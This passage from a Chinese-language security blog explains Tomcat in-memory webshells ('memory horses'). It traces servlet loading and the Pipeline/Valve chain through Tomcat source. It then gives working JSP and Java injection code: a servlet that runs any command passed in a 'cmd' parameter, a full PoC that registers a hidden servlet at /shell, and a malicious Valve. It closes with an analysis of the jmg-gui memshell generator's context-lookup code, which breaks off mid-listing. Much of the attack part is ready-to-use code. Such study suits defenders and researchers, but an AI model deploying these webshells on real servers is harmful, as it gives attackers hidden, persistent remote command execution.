<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/aaa&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">request</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;this is web1&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">        out.println(name);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">name1</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">            name1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            name1.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">            bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://java/cmd.class&quot;</span>));</span><br><span class="line">            <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">            tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            bytecodes.set(templates,codes);</span><br><span class="line">            templates.getOutputProperties();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        doGet(req,res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过下面调试获取其classloader，这里是ParallelWedappClassLoader，其父类为URLClassLoader方法，这里就导致一些在Tomcat的类无法正常被加载，导致注册失败</p>
<p><img src="/images/tomcat20.png" width="100%" height="80%"></p>
<p>虽然这里无法正常的实现但是还有其它方法，不仅仅只有上述方法来获取StandardContext对象，比如可以通过遍历当前的进程来实现获取，最后获取StandardContext对象</p>
<h3 id="Servlet-型"><a href="#Servlet-型" class="headerlink" title="Servlet**型**"></a><strong>Servlet**</strong>型**</h3><p>先了解一下Servlet创建流程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</span></span><br><span class="line"><span class="comment">初始化：当Servlet被实例化后，Tomcat会调用init()方法初始化这个对象</span></span><br><span class="line"><span class="comment">处理服务：当浏览器访问Servlet的时候，Servlet 会调用service()方法处理请求</span></span><br><span class="line"><span class="comment">销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用destroy()方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</span></span><br><span class="line"><span class="comment">卸载：当Servlet调用完destroy()方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用init()方法进行初始化操作</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>这里可以知道如果想要注册一个恶意的servlet内存马，最好利用是通过service方法，因为它的触发条件为请求访问时调用，下面就先创建一个恶意的servlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">service</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init 触发&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;service 触发&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先先明白一点，servlet是由上下文context创建wrapper包装，所以我们需要先了解wrapper的创建</p>
<p>在StandardContext#startInternal中，调用了fireLifecycleEvent()方法解析web.xml文件，我们跟进</p>
<p><img src="/images/tomcat21.png" width="100%" height="80%"></p>
<p>来到fireLifecycleEvent方法里面</p>
<p><img src="/images/tomcat22.png" width="100%" height="80%"></p>
<p>最终通过ContextConfig#webConfig()方法解析web.xml获取各种配置参数,里面通过调用configureContext方法来从context里面获取web.xml里面的信息，跟进去看</p>
<p><img src="/images/tomcat23.png" width="100%" height="80%"></p>
<p><img src="/images/tomcat24png.png" width="100%" height="80%"></p>
<p><img src="/images/tomcat25.png" width="100%" height="80%"></p>
<p>最后通过ContextConfig#addServletContainerInitializer来添加</p>
<p><img src="/images/tomcat26.png" width="100%" height="80%"></p>
<p>下面是加载StandWrapper的过程分析</p>
<p>首先在StandardContext#startInternal方法里面通过findChildren()获取StandardWrapper类</p>
<p><img src="/images/tomcat27.png" width="100%" height="80%"></p>
<p>下面通过loadOnStartUp()方法加载wrapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">            list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            map.put(key, list);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                getLogger().error(sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>,</span><br><span class="line">                      getName(), wrapper.getName()), StandardWrapper.getRootCause(e));</span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws</span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT</span></span><br><span class="line">                <span class="comment">// fatal to application startup</span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span>(getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在里面添加了一个if判断，其中就是对于wrapper的loadOnStartup进行判断，只有loadOnStartup大于0才可以继续往下进行加载wrapper</p>
<p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过loadOnStartup属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中，所以这里需要手动的修改loadOnStartup，使其能加载到内存部分</p>
<p><img src="/images/tomcat28.png" width="100%" height="80%"></p>
<p>注册动态的Servlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">获取StandardContext对象</span><br><span class="line">编写恶意Servlet</span><br><span class="line">通过StandardContext.createWrapper()创建StandardWrapper对象</span><br><span class="line">设置StandardWrapper对象的loadOnStartup属性值</span><br><span class="line">设置StandardWrapper对象的ServletName属性值</span><br><span class="line">设置StandardWrapper对象的ServletClass属性值</span><br><span class="line">将StandardWrapper对象添加进StandardContext对象的children属性中</span><br><span class="line">通过StandardContext.addServletMappingDecoded()添加对应的路径映射</span><br></pre></td></tr></table></figure>
<p>创建StandardContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
<p>下面创建恶意的Servlet类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>下面创建wrapper并且将其放置到standardContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"><span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">wrapper.setName(name);</span><br><span class="line">wrapper.setServlet(shell_servlet);</span><br><span class="line">wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br></pre></td></tr></table></figure>
<p>完整的poc为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>对于tomcat的管道机制简单介绍</p>
<p>管道机制有一个核心的容器主键(Pipeline)，它的作用是处理请求</p>
<p>对于从contianer中获取的请求体，需要通过使用Pipeline容器来一层一层的调用Valve闸门，这里主要通过Valve属性的invoke来对请求进行处理，并作出相应</p>
<p>具体流程如下图</p>
<p><img src="/images/tomcat29.jpg" width="100%" height="80%"></p>
<p>下面就是对于Pipeline负责链调用流程的简单分析</p>
<p>首先看到Pipeline接口里面声明的方法，其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getBasic</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Valve[] getValves();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; result)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看看Valve接口里面声明的方法，其中invoke里面就是处理和响应的主体，所以在创建恶意Valve时可以通过使invoke来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valvve</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例</p>
<p>对于context容器里面由于需要处理请求，所以应该会有对Pipeline进行操作，下面就去找哪里会进行操作</p>
<p>来到CoyoteAdapter#service方法里面，当直接访问时就会调试到这里，下面就看看其调用链</p>
<p><img src="/images/tomcat30.png" width="100%" height="80%"></p>
<p>它的service方法里面就提到了一个完整的调用链</p>
<p><img src="/images/tomcat31.png" width="100%" height="80%"></p>
<p>首先先从connector调用到StandardEngineValve#invoke</p>
<p><img src="/images/tomcat32.png" width="100%" height="80%"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Select the Host to be used for this Request</span></span><br><span class="line">    <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> request.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span>) &#123;</span><br><span class="line">        response.sendError</span><br><span class="line">            (HttpServletResponse.SC_BAD_REQUEST,</span><br><span class="line">             sm.getString(<span class="string">&quot;standardEngine.noHost&quot;</span>,</span><br><span class="line">                          request.getServerName()));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (request.isAsyncSupported()) &#123;</span><br><span class="line">        request.setAsyncSupported(host.getPipeline().isAsyncSupported());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ask this Host to process this request</span></span><br><span class="line">    host.getPipeline().getFirst().invoke(request, response);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里最后又嵌套调用下一个Value类的invoke，最后直到处理完请求</p>
<p>下面要找到哪里可以将恶意的Value添加进去，前面知道在Pipeline接口中存在一个addValve方法，毋庸置疑这个就是用于添加Valve的方法，对于实现Pipeline接口的类只有StandardPipeline里面存在addValve方法的实现，但是这里不能直接创建一个StandardPipeline对象，因为Pipeline 和 Valve 的使用通常需要一定的上下文环境，如果没有就会报错</p>
<p>所以这里的处理方式就是通过在context里面进行寻找，这里面肯定存在，或者可以找哪里调用了StandardPipeline#addValve方法，这里就也可以进行锁定类，这里面的ContainerBase里面调用了</p>
<p><img src="/images/tomcat33.png" width="100%" height="80%"></p>
<p>并且它是StandardContext的父类，这个就满足了获取的条件</p>
<p>ContainerBase#addValve可以直接添加</p>
<p><img src="/images/tomcat34.png" width="100%" height="80%"></p>
<p>或者可以通过getPipeline也可以直接获取上下文中的Pipeline对象，然后调用其中的addValve方法</p>
<p><img src="/images/tomcat35.png" width="100%" height="80%"></p>
<p>下面又是获取Context的问题了，注册恶意的Valve过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">获取StandardContext对象</span><br><span class="line">通过StandardContext对象获取StandardPipeline</span><br><span class="line">编写恶意Valve</span><br><span class="line">通过StandardPipeline.addValve()动态添加Valve</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    context.addValve(<span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h2 id="jmg-gui构造链分析"><a href="#jmg-gui构造链分析" class="headerlink" title="jmg-gui构造链分析"></a>jmg-gui构造链分析</h2><p>这个内存马生成工具(jmg-gui)是<a href="https://github.com/pen4uin">pen4uin</a>师傅写的，里面无需用上述的方法来获取context类，在对于正常的反序列化来说可能无法通过jsp文件来进行动态注册内存马，我们是希望在对恶意的类进行加载后就实现注册功能，而不是通过上传一个jsp文件来实现，而如果通过第二个方法来加载context还是有一定的限制</p>
<p>下面看一下其中获取context的方法，这里主要的思想是通过筛选线程的名字和类加载器来实现获取，这里不仅仅是tomcat框架，它还支持spring boot的环境下，这种方式就可以在恶意类加载中获取对应的context，方便对上述动态注入进行后续操作，一旦加载字节码就可以直接动态注册</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Object&gt; <span class="title function_">getContext</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">    List&lt;Object&gt; contexts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">    Thread[] threads = (Thread[]) invokeMethod(Thread.class, <span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="comment">// 适配 v5/v6/7/8</span></span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;ContainerBackgroundProcessor&quot;</span>) &amp;&amp; context == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">childrenMap</span> <span class="operator">=</span> (HashMap) getFV(getFV(getFV(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                <span class="comment">// 原: map.get(&quot;localhost&quot;)</span></span><br><span class="line">                <span class="comment">// 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败</span></span><br><span class="line">                <span class="keyword">for</span> (Object key : childrenMap.keySet()) &#123;</span><br><span class="line">                    <span class="type">HashMap</span> <span class="variable">children</span> <span class="operator">=</span> (HashMap) getFV(childrenMap.get(key), <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    <span class="comment">// 原: context = children.get(&quot;&quot;);</span></span><br><span class="line">                    <span class="comment">// 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败</span></span><br><span class="line">                    <span class="keyword">for</span> (Object key1 : children.keySet()) &#123;</span><br><span class="line">                        context = children.get(key1);</span><br><span class="line">                        <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>))</span><br><span class="line">                            contexts.add(context);</span><br><span class="line">                        <span class="comment">// 兼容 spring boot 2.x embedded tomcat</span></span><br><span class="line">                        <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>))</span><br><span class="line">                            contexts.add(context);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 适配 tomcat v9</span></span><br><span class="line">            <span class="comment">//这里的ParallelWebappClassLoader默认为tomcat的构造器，而TomcatEmbeddedWebappClassLoader则为spring boot的构造器</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (thread.getContextClassLoader() != <span class="literal">null</span> &amp;&amp; (thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;ParallelWebappClassLoader&quot;</span>) || thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;TomcatEmbeddedWebappClassLoader&quot;</span>))) &#123;</span><br><span class="line">                context = 